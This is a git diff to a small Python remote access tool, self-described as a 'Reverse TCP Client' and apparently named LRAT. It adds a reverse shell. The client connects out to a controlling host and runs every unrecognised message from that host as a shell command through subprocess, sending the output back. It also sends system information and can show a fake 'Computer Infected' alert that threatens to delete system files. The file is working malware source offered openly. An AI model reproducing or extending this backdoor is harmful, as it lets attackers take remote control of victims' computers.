@@ -1,4 +1,7 @@
 # A Really Basic Reverse TCP Client.
+# Update : October 29 2018
+# Added Reverse shell
+
 import socket
 import os
 from threading import Thread
@@ -9,6 +12,7 @@ import datetime
 import webbrowser
 from tkinter import messagebox
 import platform
+import sys
 
 def __main__():
     os.system("clear")
@@ -36,7 +40,7 @@ def __main__():
             if(data == "info"):
                 server.send("At this time the Attack is Complete. You and me are Connected. So now you can send me Commands that I can follow.".encode())
             elif(data == "help"):
-                server.send("Basic Commands : sysinfo, time, lol, cool, contribute, troll. I will follow these.".encode())
+                server.send("Basic Commands : sysinfo, time, lol, cool, contribute, troll. Everything else will be Executed in Shell.".encode())
             elif(data == "sysinfo"):
                 sysinfo = platform.version() + platform.system() + platform.platform() 
                 server.send(sysinfo.encode())
@@ -55,8 +59,10 @@ def __main__():
                 server.send("OK, will do it.".encode())
                 messagebox.showerror("SYSTEM ERROR", "Computer Infected by LRAT now will DELETE System FILES!")
             else:
-                server.send("I don't understand this. Perhaps you can modify me.".encode())
-            
+                proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                var_stdout = proc.stdout.read() + proc.stderr.read()
+                res = var_stdout 
+                server.send(res)
     try:
         server.connect((host, port))
         server_management()
